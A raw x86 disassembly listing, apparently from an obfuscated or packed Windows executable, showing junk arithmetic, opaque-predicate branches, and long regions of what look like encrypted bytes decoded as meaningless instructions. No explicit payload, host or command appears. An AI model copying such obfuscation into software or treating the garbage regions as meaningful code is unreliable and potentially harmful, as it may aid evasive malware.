  40970b:	sbb    DWORD PTR ds:0x428565,0xdcf
  409715:	mov    esi,DWORD PTR [ebp-0x1c]
  409718:	add    eax,0x355c
  40971d:	mov    DWORD PTR ds:0x42836d,0x28d
  409727:	adc    ecx,0x819
  40972d:	xor    DWORD PTR ds:0x428331,0x49ee
  409737:	or     eax,edx
  409739:	mov    DWORD PTR ds:0x428365,0x383a
  409743:	mov    edx,DWORD PTR [ebp-0x10]
  409746:	or     ecx,esi
  409748:	sub    DWORD PTR ds:0x428359,0x6778
  409752:	mov    esi,DWORD PTR [ebp-0xc]
  409755:	or     eax,edx
  409757:	movzx  edx,BYTE PTR ds:0x42854d
  40975e:	xor    edx,DWORD PTR ds:0x428465
  409764:	mov    DWORD PTR ds:0x42854d,edx
  40976a:	mov    edx,DWORD PTR [ebp-0x30]
  40976d:	or     ecx,esi
  40976f:	mov    esi,DWORD PTR [ebp-0x2c]
  409772:	or     eax,0xf34
  409777:	neg    DWORD PTR ds:0x428469
  40977d:	or     ecx,0x6c90
  409783:	mov    DWORD PTR ds:0x42845d,0x7584
  40978d:	cmp    edx,eax
  40978f:	mov    DWORD PTR ds:0x428441,0x7ecb
  409799:	jne    0x4097bb
  40979f:	mov    DWORD PTR ds:0x42840d,0x4655
  4097a9:	cmp    esi,ecx
  4097ab:	mov    DWORD PTR ds:0x42840d,0x7ff3
  4097b5:	je     0x40a10f
  4097bb:	xor    esi,esi
  4097bd:	or     esi,DWORD PTR ds:0x42855d
  4097c3:	adc    DWORD PTR ds:0x4284e5,esi
  4097c9:	mov    DWORD PTR [ebp-0x30],0x5ddc
  4097d0:	mov    DWORD PTR [ebp-0x2c],0x7433
  4097d7:	mov    eax,DWORD PTR [ebp-0x30]
  4097da:	mov    ecx,DWORD PTR [ebp-0x2c]
  4097dd:	xor    ecx,0xfffffd1f
  4097e3:	xor    eax,0xffff9fff
  4097e8:	and    ecx,0x6e0
  4097ee:	and    eax,0x6244
  4097f3:	mov    DWORD PTR [ebp-0x10],eax
  4097f6:	mov    DWORD PTR [ebp-0xc],ecx
  4097f9:	mov    DWORD PTR [ebp-0x20],0x4a50
  409800:	mov    DWORD PTR [ebp-0x1c],0x2079
  409807:	mov    DWORD PTR [ebp-0x28],0x792e
  40980e:	mov    DWORD PTR [ebp-0x24],0x10e8
  409815:	mov    DWORD PTR [ebp-0x30],0x22b3
  40981c:	mov    DWORD PTR [ebp-0x2c],0x2293
  409823:	mov    eax,DWORD PTR [ebp-0x30]
  409826:	mov    ecx,DWORD PTR [ebp-0x2c]
  409829:	mov    edx,DWORD PTR [ebp-0x28]
  40982c:	mov    esi,DWORD PTR [ebp-0x24]
  40982f:	add    eax,edx
  409831:	mov    edx,DWORD PTR [ebp-0x20]
  409834:	adc    ecx,esi
  409836:	mov    esi,DWORD PTR [ebp-0x1c]
  409839:	add    eax,0x3e60
  40983e:	adc    ecx,0xd49e
  409844:	xor    eax,0x14ce
  409849:	xor    ecx,0x354f
  40984f:	add    eax,edx
  409851:	mov    edx,DWORD PTR [ebp-0x10]
  409854:	adc    ecx,esi
  409856:	mov    esi,DWORD PTR [ebp-0xc]
  409859:	cmp    edx,eax
  40985b:	jne    0x409869
  409861:	cmp    esi,ecx
  409863:	je     0x40a10f
  409869:	mov    DWORD PTR [ebp-0x28],0x4db
  409870:	mov    DWORD PTR [ebp-0x24],0x233b
  409877:	mov    DWORD PTR [ebp-0x30],0x2c94
  40987e:	push   0x6b33
  409883:	mov    DWORD PTR [ebp-0x2c],0x647f
  40988a:	jmp    0x409b09
  40988f:	and    BYTE PTR [ebx-0x53bd1443],ah
  409895:	sub    al,0xab
  409897:	dec    edi
  409898:	test   al,0xc
  40989a:	xchg   edx,eax
  40989b:	stos   BYTE PTR es:[edi],al
  40989c:	sub    cl,BYTE PTR [eax-0x6e]
  40989f:	xacquire xchg DWORD PTR [esi-0x413d8642],edi
  4098a6:	mov    esi,0xdade45a7
  4098ab:	shr    DWORD PTR [edx+0x319af2ce],0x93
  4098b2:	or     BYTE PTR [esi],ah
  4098b4:	popf   
  4098b5:	push   esi
  4098b6:	jo     0x40989c
  4098b8:	das    
  4098b9:	push   ecx
  4098ba:	pop    ds
  4098bb:	sub    DWORD PTR [ebp+0x7b9ad95a],0xffffff87
  4098c2:	dec    ecx
  4098c3:	sbb    al,0x71
  4098c5:	add    DWORD PTR [ecx+0x59],edx
  4098c8:	mov    ebx,0x30611aa0
  4098cd:	mov    cs,WORD PTR ds:0x7c7eb4ea
  4098d3:	sbb    DWORD PTR [ebx+0x5f],esp
  4098d6:	and    DWORD PTR [eax+0x57],esi
  4098d9:	sar    edx,1
  4098db:	pop    edx
  4098dc:	(bad)  [esi-0x4d]
  4098df:	sub    DWORD PTR [esi],esi
  4098e1:	or     al,0x2b
  4098e3:	mov    ebx,0xb5049a52
  4098e8:	arpl   WORD PTR [ebp+0x21],dx
  4098eb:	fiadd  WORD PTR [ecx+0x7465de25]
  4098f1:	mov    ch,0xfb
  4098f3:	jnp    0x40988a
  4098f5:	jl     0x409902
  4098f7:	add    al,0xda
  4098f9:	enter  0x7219,0x1c
  4098fd:	xchg   esi,eax
  4098fe:	loope  0x409968
  409900:	mov    ebp,0xa17f1715
  409905:	xor    eax,0x46e8d3ed
  40990a:	fld    TBYTE PTR [esi-0x63692754]
  409910:	jecxz  0x4098d6
  409912:	mov    dh,0x6a
  409914:	sbb    eax,0x8ff6d700
  409919:	jno    0x40993e
  40991b:	(bad)  [ebx-0x27]
  40991e:	sbb    ebx,edi
  409920:	aam    0xe1
  409922:	in     eax,0x65
  409924:	dec    ebx
  409925:	mov    edi,0xcd530561
  40992a:	push   0xffffffc8
  40992c:	popf   
  40992d:	ror    BYTE PTR [ecx+0x1c],1
  409930:	pop    es
  409931:	inc    eax
  409932:	jnp    0x409917
  409934:	(bad)  
  409935:	cmp    al,dh
  409937:	xchg   esp,eax
  409938:	xor    esi,esp
  40993a:	and    esp,DWORD PTR [edx-0x76f1fb3c]
  409940:	xchg   esp,eax
  409941:	xchg   DWORD PTR [edi+ebx*4-0x428e8e52],edi
  409948:	or     eax,0x3c56712
  40994d:	dec    esp
  40994e:	hlt    
  40994f:	fild   DWORD PTR [edx+0x78]
  409952:	into   
  409953:	push   edx
  409954:	mov    al,0x54
  409956:	push   esi
  409957:	mov    dh,0xd1
  409959:	jne    0x409953
  40995b:	or     eax,0x9bafd899
  409960:	pusha  
  409961:	sbb    ecx,esp
  409963:	outs   dx,BYTE PTR ds:[esi]
  409964:	out    dx,eax
  409965:	movaps xmm0,xmm7
  409968:	ja     0x409910
  40996a:	lods   al,BYTE PTR ds:[esi]
  40996b:	loope  0x409929
  40996d:	mov    ah,BYTE PTR [esi]
  40996f:	xchg   DWORD PTR [ebp-0x78],edx
  409972:	pop    ds
  409973:	mov    ch,ch
  409975:	jbe    0x4099a2
  409977:	rcr    edi,cl
  409979:	or     BYTE PTR [ecx+0x297d7f1c],dl
  40997f:	(bad)  
  409980:	imul   ebp,DWORD PTR [ecx+0xa],0x35
  409984:	loop   0x40990c
  409986:	cmp    ebp,ebp
  409988:	ss jge 0x409996
  40998b:	into   
  40998c:	bound  ebx,QWORD PTR [eax]
  40998e:	jno    0x4099fa
  409990:	sbb    eax,0xb870b2df
  409995:	enter  0x2861,0x36
  409999:	dec    eax
  40999a:	outs   dx,DWORD PTR ds:[esi]
  40999b:	retf   
  40999c:	mov    ebx,0xcbe15472
  4099a1:	xlat   BYTE PTR ds:[ebx]
  4099a2:	outs   dx,BYTE PTR ds:[esi]
  4099a3:	neg    DWORD PTR [edi+0x1f]
  4099a6:	lds    edi,FWORD PTR [edx]
  4099a8:	pushf  
  4099a9:	jb     0x40998c
  4099ab:	ret    0x5585
  4099ae:	(bad)  
  4099af:	mov    eax,ds:0xc2d45ad1
  4099b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099b5:	inc    eax
  4099b6:	push   esi
  4099b7:	push   cx
  4099b9:	inc    esi
  4099ba:	nop
  4099bb:	add    edi,DWORD PTR [ebx]
  4099bd:	sar    BYTE PTR [esi-0x3],0x32
  4099c1:	or     DWORD PTR [ebx+eiz*4+0x15],ecx
  4099c5:	jne    0x409971
  4099c7:	sub    BYTE PTR [ecx+0x712b529d],bl
  4099cd:	mov    ch,0x60
  4099cf:	lock mov al,ds:0xaa4a253
  4099d5:	dec    eax
  4099d6:	aas    
  4099d7:	inc    ecx
  4099d8:	pop    esi
  4099d9:	and    edi,DWORD PTR [esi+0x41cf0931]
  4099df:	and    dh,bl
  4099e1:	icebp  
  4099e2:	jno    0x4099a9
  4099e4:	cmp    al,0x21
  4099e6:	fcomp  DWORD PTR [ebp-0x2b]
  4099e9:	sbb    ecx,DWORD PTR [ebx-0x56040f18]
  4099ef:	xchg   esi,eax
  4099f0:	pop    ss
  4099f1:	jp     0x409a6d
  4099f3:	sar    BYTE PTR [ecx+0x20f86c1c],0xd4
  4099fa:	sti    
  4099fb:	pop    edx
  4099fc:	xor    ah,dl
  4099fe:	mov    ds:0xed1fd2c5,eax
  409a03:	fisttp WORD PTR [edi+ebp*8-0x3e]
  409a07:	es add al,0x69
  409a0a:	adc    bl,BYTE PTR [esp+edx*2-0x76c147fa]
  409a11:	aam    0x31
  409a13:	cs loopne 0x4099bd
  409a16:	dec    esi
  409a17:	and    dh,BYTE PTR [esi]
  409a19:	popf   
  409a1a:	stc    
  409a1b:	cwde   
  409a1c:	sbb    eax,0xc4e411c4
  409a21:	imul   eax,DWORD PTR [edx+0x4b105b85],0x99d7d27a
  409a2b:	jb     0x409a2c
  409a2d:	pop    ss
  409a2e:	sahf   
  409a2f:	xchg   edx,eax
  409a30:	jmp    0x964dbc28
  409a35:	xor    BYTE PTR [edx],bh
  409a37:	imul   BYTE PTR [edx+0x7]
  409a3a:	mov    cl,0x27
  409a3c:	std    
  409a3d:	ficomp WORD PTR [ebx-0x1db0baa0]
  409a43:	push   ebx
  409a44:	repz sub al,0x64
  409a47:	std    
  409a48:	repnz sbb esi,DWORD PTR [ecx-0x10]
  409a4c:	jbe    0x4099d2
  409a4e:	pop    ds
  409a4f:	lds    edi,FWORD PTR [ebp-0x754b82bb]
  409a55:	(bad)  
  409a56:	jge    0x409a2f
  409a58:	ss ss ret 
  409a5b:	ror    edi,0xd6
  409a5e:	test   eax,0xaf3a3fe
  409a63:	leave  
  409a64:	jae    0x409a91
  409a66:	and    BYTE PTR ds:0x5ea5bf70,0xa5
  409a6d:	popf   
  409a6e:	jmp    0x409a8a
  409a70:	push   ecx
  409a71:	lea    edx,[ecx-0x24229a09]
  409a77:	xchg   edi,eax
  409a78:	or     eax,0xd83d1d1f
  409a7d:	inc    ecx
  409a7e:	ffree  st(6)
  409a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a81:	dec    edi
  409a82:	and    ecx,esi
  409a84:	stos   DWORD PTR es:[edi],eax
  409a85:	fiadd  DWORD PTR [edi+ebp*8]
  409a88:	test   al,0x26
  409a8a:	add    bh,cl
  409a8c:	dec    esi
  409a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a8e:	inc    edx
  409a8f:	dec    BYTE PTR [ebx+ecx*1+0x70aba913]
  409a96:	popf   
  409a97:	loope  0x409a79
  409a99:	pop    eax
  409a9a:	cmp    al,0x4e
  409a9c:	mov    dh,0xf4
  409a9e:	push   ecx
  409a9f:	and    DWORD PTR [esi],edx
  409aa1:	pop    edi
  409aa2:	sbb    al,0x61
  409aa4:	ret    
  409aa5:	mov    bh,BYTE PTR [eax+0x27]
  409aa8:	dec    edi
  409aa9:	and    esp,DWORD PTR [edi+0x2d5195ec]
  409aaf:	sub    eax,0x61dd5bbc
  409ab4:	mov    bh,0xfe
  409ab6:	add    al,BYTE PTR [esi+0x19]
  409ab9:	jnp    0x409ac1
  409abb:	sar    BYTE PTR [edx],cl
  409abd:	pop    ds
  409abe:	scas   eax,DWORD PTR es:[edi]
  409abf:	inc    esi
  409ac0:	pop    ebp
  409ac1:	(bad)  
  409ac2:	pop    esp
  409ac3:	ds not ecx
  409ac6:	shr    BYTE PTR [eax-0x7f],0x82
  409aca:	pop    edx
  409acb:	mov    ebx,0xcbe4165
  409ad0:	sar    BYTE PTR [esp+eax*8+0x2b],1
  409ad4:	test   eax,0xe71ba472
  409ad9:	mov    bl,0x3
  409adb:	xchg   esp,eax
  409adc:	sbb    DWORD PTR [esi-0x19],eax
  409adf:	call   ebp
  409ae1:	xchg   BYTE PTR es:[edx+ebx*8-0x4b6917a5],dl
  409ae9:	jne    0x409aba
  409aeb:	imul   bl
  409aed:	sbb    bh,dh
  409aef:	lea    ebp,[esi]
  409af1:	pop    ecx
  409af2:	icebp  
  409af3:	pop    edx
  409af4:	jne    0x409a8c
  409af6:	dec    ecx
  409af7:	les    ebp,FWORD PTR [eax+edi*1+0x3c366e5d]
  409afe:	popf   
  409aff:	adc    al,0xed
  409b01:	xor    cl,BYTE PTR [ebx+0x72]
  409b04:	mov    dl,al
  409b06:	mov    DWORD PTR [esi-0x2fba741a],edi
  409b0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  409b0f:	push   0x7c8f
  409b14:	push   ecx
  409b15:	push   eax
  409b16:	call   0x41594e
  409b1b:	mov    ecx,DWORD PTR [ebp-0x28]
  409b1e:	mov    esi,DWORD PTR [ebp-0x24]
  409b21:	push   0x4e1a18a
  409b26:	push   0x283cdcc
  409b2b:	and    edx,esi
  409b2d:	and    eax,ecx
  409b2f:	push   edx
  409b30:	push   eax
  409b31:	call   0x41594e
  409b36:	xor    eax,0x687b
  409b3b:	xor    edx,0x18d4
  409b41:	mov    DWORD PTR [ebp-0x30],eax
  409b44:	mov    DWORD PTR [ebp-0x2c],edx
  409b47:	mov    eax,ds:0x42291c
  409b4c:	cmp    eax,0x7cd80819
  409b51:	jne    0x40a10f
  409b57:	mov    eax,DWORD PTR [ebp-0x18]
  409b5a:	mov    ecx,DWORD PTR [ebp-0x14]
  409b5d:	mov    edx,DWORD PTR [ebp-0x18]
  409b60:	mov    esi,DWORD PTR [ebp-0x14]
  409b63:	shrd   eax,ecx,0x2
  409b67:	shl    edx,0x1e
  409b6a:	mov    edx,DWORD PTR ds:0x422708
  409b70:	mov    edx,DWORD PTR [edx+0x1a8]
  409b76:	shr    ecx,0x2
  409b79:	xor    esi,esi
  409b7b:	mov    ecx,0x32de6d5d
  409b80:	xor    eax,ecx
  409b82:	or     eax,esi
  409b84:	mov    DWORD PTR [edx],eax
  409b86:	mov    eax,DWORD PTR [ebp-0x18]
  409b89:	mov    edx,DWORD PTR [ebp-0x14]
  409b8c:	shrd   eax,edx,0x2
  409b90:	shr    edx,0x2
  409b93:	mov    edx,DWORD PTR [ebp-0x18]
  409b96:	mov    esi,DWORD PTR [ebp-0x14]
  409b99:	xor    eax,ecx
  409b9b:	xor    esi,esi
  409b9d:	or     eax,esi
  409b9f:	mov    ds:0x42291c,eax
  409ba4:	mov    BYTE PTR [ebp-0x2],0x4f
  409ba8:	mov    BYTE PTR [ebp-0x1],0xf9
  409bac:	movzx  eax,BYTE PTR [ebp-0x1]
  409bb0:	shl    edx,0x1e
  409bb3:	mov    dl,BYTE PTR [ebp-0x2]
  409bb6:	xor    al,0x42
  409bb8:	add    al,dl
  409bba:	jmp    0x409e39
  409bbf:	mov    ah,0x7e
  409bc1:	mov    ch,0xd4
  409bc3:	mov    ebx,0x3e9ebcfc
  409bc8:	mov    cl,0x9a
  409bca:	jecxz  0x409bc2
  409bcc:	xor    DWORD PTR [edx],0xffffffdd
  409bcf:	scas   al,BYTE PTR es:[edi]
  409bd0:	mov    edi,DWORD PTR [esi-0x413d8642]
  409bd6:	mov    esi,0x8c9ce076
  409bdb:	xor    DWORD PTR [edi+0x67],eax
  409bde:	sar    BYTE PTR [esp+esi*2+0x13],0x28
  409be3:	mov    bh,0x61
  409be5:	push   edx
  409be6:	cli    
  409be7:	push   ebp
  409be8:	mov    ecx,0xf92e2e3a
  409bed:	test   DWORD PTR [ebx+eax*2-0x2428ad98],0x4f90a38
  409bf8:	push   cs
  409bf9:	mov    eax,0x71b5684f
  409bfe:	sbb    eax,0x32ca64ce
  409c03:	xor    bl,BYTE PTR [esi]
  409c05:	sti    
  409c06:	std    
  409c07:	xchg   esp,eax
  409c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c0a:	dec    ebx
  409c0b:	test   al,0x5f
  409c0d:	jb     0x409c2b
  409c0f:	repnz mov ds:0x4b15d273,eax
  409c15:	fld    QWORD PTR [ebp+ecx*1+0x23]
  409c19:	mov    ds:0x7aded4a,al
  409c1e:	cbw    
  409c20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c21:	lea    edx,[edx]
  409c23:	aaa    
  409c24:	sub    ch,0x16
  409c27:	cmp    ah,cl
  409c29:	add    al,0xc
  409c2b:	xchg   edx,ebp
  409c2d:	test   eax,0xa2e80bde
  409c32:	push   ss
  409c33:	(bad)  
  409c34:	xor    eax,0x7254cfb7
  409c39:	das    
  409c3a:	jbe    0x409c21
  409c3c:	mov    es,WORD PTR [edi+ebx*4+0x40d021c6]
  409c43:	mov    edx,0x85052e6c
  409c48:	and    eax,0x29aadb96
  409c4d:	sbb    bh,dl
  409c4f:	mov    dl,0xa6
  409c51:	jle    0x409c25
  409c53:	cld    
  409c54:	push   eax
  409c55:	sti    
  409c56:	add    DWORD PTR [ecx-0xe],ebx
  409c59:	and    dl,BYTE PTR [eax+0x41]
  409c5c:	pop    ebp
  409c5d:	repz in al,0xf3
  409c60:	add    ah,bl
  409c62:	js     0x409ca6
  409c64:	in     al,dx
  409c65:	and    al,0xe4
  409c67:	imul   esp,DWORD PTR [esi+ebx*4+0x1fdd335d],0x2d
  409c6f:	imul   esi,DWORD PTR [edi+0xce58852],0xffffffa7
  409c76:	int    0x3b
  409c78:	sbb    BYTE PTR [ecx+0x68d5802a],dh
  409c7e:	add    bl,dl
  409c80:	and    eax,0xfff75409
  409c85:	and    ah,BYTE PTR [edx]
  409c87:	mov    ecx,esi
  409c89:	and    ch,0x43
  409c8c:	mov    ch,0xe
  409c8e:	pop    eax
  409c8f:	mov    ch,0xe
  409c91:	int3   
  409c92:	lahf   
  409c93:	mov    cl,0xef
  409c95:	and    eax,0xbd85ef73
  409c9a:	daa    
  409c9b:	or     eax,0xe3662d65
  409ca0:	ret    0xc897
  409ca3:	xor    ebp,edi
  409ca5:	sbb    bl,BYTE PTR [edx]
  409ca7:	shr    BYTE PTR [ebx-0x2d],cl
  409caa:	mov    eax,0x8f59a3d5
  409caf:	dec    esi
  409cb0:	xchg   edi,eax
  409cb1:	or     edx,esi
  409cb3:	push   ecx
  409cb4:	jb     0x409c7b
  409cb6:	push   esp
  409cb7:	daa    
  409cb8:	loop   0x409c76
  409cba:	popf   
  409cbb:	mov    ecx,0x351f6a5f
  409cc0:	dec    edi
  409cc1:	add    DWORD PTR [ebx],edx
  409cc3:	dec    ebp
  409cc4:	ret    
  409cc5:	imul   esp,DWORD PTR [ecx-0x6fa544f8],0xfffffffa
  409ccc:	xor    BYTE PTR [ebx-0x2881d622],bh
  409cd2:	fisttp QWORD PTR [edi-0x220842c1]
  409cd8:	in     al,dx
  409cd9:	ja     0x409c5f
  409cdb:	shl    BYTE PTR [esi-0x75],cl
  409cde:	ds inc edi
  409ce0:	dec    eax
  409ce1:	scas   al,BYTE PTR es:[edi]
  409ce2:	in     al,0xc6
  409ce4:	inc    ebx
  409ce5:	jle    0x409d12
  409ce7:	mov    ebp,0xb6013988
  409cec:	je     0x409d29
  409cee:	sub    esi,DWORD PTR [ecx+edx*4-0x1f]
  409cf2:	jl     0x409d1d
  409cf4:	cmp    al,0x9
  409cf6:	adc    al,0xa
  409cf8:	ficom  DWORD PTR [edi+ebp*1+0x326018ce]
  409cff:	xchg   esp,eax
  409d00:	xchg   ecx,eax
  409d01:	mov    al,0x73
  409d03:	dec    esi
  409d04:	lea    ecx,[ebp+0x6c]
  409d07:	arpl   WORD PTR [ecx-0x2a],si
  409d0a:	xor    BYTE PTR [eax+0x3337e60f],cl
  409d10:	xchg   esp,eax
  409d11:	ins    DWORD PTR es:[edi],dx
  409d12:	jmp    0x6bf7693
  409d17:	(bad)  
  409d18:	pop    eax
  409d19:	ret    0x9bdf
  409d1c:	or     DWORD PTR [esp+edx*1],eax
  409d1f:	icebp  
  409d20:	aad    0xaa
  409d22:	inc    ecx
  409d23:	mov    ds:0xec993e9f,al
  409d28:	add    ecx,ebp
  409d2a:	mov    WORD PTR [esi],?
  409d2c:	dec    eax
  409d2d:	mov    ebp,0x1e9007a8
  409d32:	fist   DWORD PTR [edi-0x23]
  409d35:	rcl    DWORD PTR [edi+0x22],0x22
  409d39:	mov    dl,bh
  409d3b:	sbb    DWORD PTR [edi+0x0],ecx
  409d3e:	lock inc ebx
  409d40:	sbb    ebx,0xb1c3fd0
  409d46:	mov    ebx,0xe8bc8e39
  409d4b:	loope  0x409d96
  409d4d:	push   ecx
  409d4e:	mov    DWORD PTR [ebp+edi*8+0x2cca3fe1],ebx
  409d55:	(bad)  
  409d56:	sar    BYTE PTR [eax+0x4a41d3a6],0x39
  409d5d:	cmp    al,0xd1
  409d5f:	mov    edi,0xfa2e765b
  409d64:	push   ebp
  409d65:	dec    esi
  409d66:	lods   al,BYTE PTR ds:[esi]
  409d67:	jbe    0x409d34
  409d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d6a:	mov    bl,0xc7
  409d6c:	pop    esp
  409d6d:	add    esi,DWORD PTR [ebp-0x66aa6b9d]
  409d73:	retf   0xf866
  409d76:	fcmovnbe st,st(0)
  409d78:	and    edx,DWORD PTR ds:0x40b1670e
  409d7e:	cmp    BYTE PTR [ebp-0x66c7ef60],ah
  409d84:	fstp   QWORD PTR [eax-0x56]
  409d87:	push   edi
  409d88:	lods   al,BYTE PTR ds:[esi]
  409d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d8a:	es cli 
  409d8c:	mov    ds:0x3cec2e16,al
  409d91:	jns    0x409da3
  409d93:	sub    eax,0x4bd61bf3
  409d98:	aad    0x59
  409d9a:	and    al,0xfc
  409d9c:	mov    esp,0xa7c39d7
  409da1:	and    eax,0xa4653bc9
  409da6:	sub    DWORD PTR [esi-0x66],esp
  409da9:	cld    
  409daa:	stc    
  409dab:	mov    edi,0xf59a1e89
  409db0:	out    0xc0,al
  409db2:	(bad)  
  409db3:	cmp    bh,al
  409db5:	dec    edx
  409db6:	jle    0x409e22
  409db8:	push   0x6e061de4
  409dbd:	ja     0x409d8b
  409dbf:	int    0x1b
  409dc1:	cld    
  409dc2:	xchg   esp,eax
  409dc3:	imul   ecx,DWORD PTR [esi+0x14],0xffffffe6
  409dc7:	pop    edi
  409dc8:	and    al,0x2e
  409dca:	mul    cl
  409dcc:	jne    0x409de7
  409dce:	gs dec ecx
  409dd0:	jnp    0x409dac
  409dd2:	aam    0x37
  409dd4:	push   0x2c1ef3e3
  409dd9:	dec    ecx
  409dda:	inc    edx
  409ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ddc:	push   ecx
  409ddd:	into   
  409dde:	ret    0x771b
  409de1:	je     0x409e17
  409de3:	inc    edi
  409de4:	inc    edx
  409de5:	addps  xmm2,XMMWORD PTR [eax-0x56]
  409de9:	mov    DWORD PTR [eax+eiz*1-0x25ad338f],0xea1f8e4b
  409df4:	push   esi
  409df5:	add    DWORD PTR [edx],eax
  409df7:	pop    esi
  409df8:	cmp    DWORD PTR [eax],0x6e
  409dfb:	jp     0x409dd6
  409dfd:	outs   dx,BYTE PTR ds:[esi]
  409dfe:	push   edi
  409dff:	adc    al,ch
  409e01:	rol    DWORD PTR [edx+0x721f7c6a],1
  409e07:	sahf   
  409e08:	aas    
  409e09:	test   edi,edi
  409e0b:	jno    0x409d8d
  409e0d:	(bad)  [ecx-0x6f]
  409e10:	pusha  
  409e11:	push   cs
  409e12:	cmp    al,0xf7
  409e14:	ret    0x9508
  409e17:	or     dh,BYTE PTR [eax-0x72]
  409e1a:	mul    DWORD PTR [esi-0x191f65c4]
  409e20:	add    dl,ah
  409e22:	jmp    0xbc1da043
  409e27:	and    eax,0x132f6bb
  409e2c:	mov    bl,0xfc
  409e2e:	cmp    ah,BYTE PTR [edi+ecx*2]
  409e31:	stc    
  409e32:	sbb    al,0x6c
  409e34:	inc    ebx
  409e35:	cwde   
  409e36:	adc    DWORD PTR [ebx+0x5066a2e],edi
  409e3c:	cli    
  409e3d:	add    BYTE PTR [eax],al
  409e3f:	add    BYTE PTR [eax+0x45c6fc45],cl
  409e45:	std    
  409e46:	addr16 pop eax
  409e48:	mov    BYTE PTR [ebp-0x1],al
  409e4b:	mov    BYTE PTR [ebp-0x2],0x3
  409e4f:	mov    dl,BYTE PTR [ebp-0x2]
  409e52:	movzx  esi,dl
  409e55:	cdq    
  409e56:	idiv   esi
  409e58:	mov    dl,BYTE PTR [ebp-0x1]
  409e5b:	add    al,dl
  409e5d:	mov    dl,BYTE PTR [ebp-0x3]
  409e60:	or     al,dl
  409e62:	mov    dl,BYTE PTR [ebp-0x4]
  409e65:	add    al,0x3a
  409e67:	cmp    dl,al
  409e69:	jae    0x40a10f
  409e6f:	mov    eax,DWORD PTR [ebp-0x18]
  409e72:	jmp    0x40a0f1
  409e77:	popa   
  409e78:	nop
  409e79:	popf   
  409e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e7b:	mov    ah,0xb8
  409e7d:	imul   ebx,DWORD PTR [eax+edi*1-0x135b79d4],0x32
  409e85:	mov    ds:0xbe916990,al
  409e8a:	mov    esi,0xbebec279
  409e8f:	mov    al,ds:0x64c256ab
  409e94:	dec    ebx
  409e95:	mov    eax,eax
  409e97:	xchg   BYTE PTR [esi-0x65],dh
  409e9a:	fst    QWORD PTR [eax+eiz*1-0x61946c47]
  409ea2:	mov    ah,0xed
  409ea4:	(bad)  
  409ea5:	mov    dl,BYTE PTR [eax-0x1e]
  409ea8:	jbe    0x409edc
  409eaa:	outs   dx,DWORD PTR ds:[esi]
  409eab:	xchg   edi,eax
  409eac:	jge    0x409f27
  409eae:	pop    ds
  409eaf:	stos   DWORD PTR es:[edi],eax
  409eb0:	pop    es
  409eb1:	mov    esi,0x7839f79f
  409eb6:	add    eax,DWORD PTR [edi]
  409eb8:	cmp    eax,0xb110ea47
  409ebd:	stos   BYTE PTR es:[edi],al
  409ebe:	fimul  WORD PTR [esp+esi*8+0x2f]
  409ec2:	push   esp
  409ec3:	adc    eax,0x15f8edab
  409ec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ec9:	sub    ebx,ebx
  409ecb:	popa   
  409ecc:	popa   
  409ecd:	inc    eax
  409ece:	add    ch,al
  409ed0:	cli    
  409ed1:	push   0xffffffd8
  409ed3:	jecxz  0x409ea3
  409ed5:	or     DWORD PTR [esi],edi
  409ed7:	(bad)  
  409ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ed9:	fidivr WORD PTR gs:[eax-0x284d5dc5]
  409ee0:	and    DWORD PTR [eax-0xd11c198],ebp
  409ee6:	mov    ds:0xc1ae313e,al
  409eeb:	push   ds
  409eec:	mov    cl,0xe5
  409eee:	mov    WORD PTR [ecx+0x4be2d7f],cs
  409ef4:	fcomi  st,st(4)
  409ef6:	stos   BYTE PTR es:[edi],al
  409ef7:	xchg   BYTE PTR [eax+0x2f764b63],dh
  409efd:	push   0xffffff95
  409eff:	mov    dh,0x53
  409f01:	fmul   DWORD PTR [ebx+0x791a2e56]
  409f07:	add    bl,BYTE PTR [ebx-0x19]
  409f0a:	arpl   WORD PTR [eax],ax
  409f0c:	adc    dl,ch
  409f0e:	push   es
  409f0f:	out    dx,eax
  409f10:	aas    
  409f11:	jg     0x409efb
  409f13:	sub    ebp,DWORD PTR ds:0x1f8d8c17
  409f19:	mov    ebp,0x39a5d8c3
  409f1e:	pop    ebx
  409f1f:	jo     0x409ec7
  409f21:	enter  0xc75,0xbf
  409f25:	mov    ch,0x71
  409f27:	je     0x409ec8
  409f29:	push   esi
  409f2a:	mov    edx,0xe69e1f76
  409f2f:	lds    ebp,FWORD PTR [ebx]
  409f31:	add    ah,ch
  409f33:	popa   
  409f34:	and    eax,0x2cf30cf6
  409f39:	rcl    al,1
  409f3b:	ds cdq 
  409f3d:	push   edi
  409f3e:	mov    bl,0x60
  409f40:	arpl   WORD PTR [esi+0x1e2adb4a],dx
  409f46:	xchg   esi,eax
  409f47:	rol    DWORD PTR [ebx+0x66583317],cl
  409f4d:	inc    ebp
  409f4e:	add    dh,BYTE PTR [esi]
  409f50:	jmp    0x409faf
  409f52:	mov    bh,0x14
  409f54:	inc    edx
  409f55:	push   cs
  409f56:	lock stos DWORD PTR es:[edi],eax
  409f58:	dec    esi
  409f59:	iret   
  409f5a:	into   
  409f5b:	sub    eax,0x6bd5ad1e
  409f60:	cmp    DWORD PTR [esi-0x44],ebp
  409f63:	test   eax,0x1470ac14
  409f68:	and    DWORD PTR [eax-0x1c],esp
  409f6b:	mov    dl,0x1c
  409f6d:	lods   al,BYTE PTR ds:[esi]
  409f6e:	pop    ss
  409f6f:	dec    DWORD PTR [ebx+0x20]
  409f72:	fwait
  409f73:	cli    
  409f74:	push   edi
  409f75:	push   edi
  409f76:	sbb    eax,0x3c4066b0
  409f7b:	inc    esp
  409f7c:	rol    ah,1
  409f7e:	add    eax,0x76d13ba0
  409f83:	arpl   WORD PTR [esi+0x2f71abc4],ax
  409f89:	xchg   ecx,eax
  409f8a:	cmp    ebx,edx
  409f8c:	adc    dl,cl
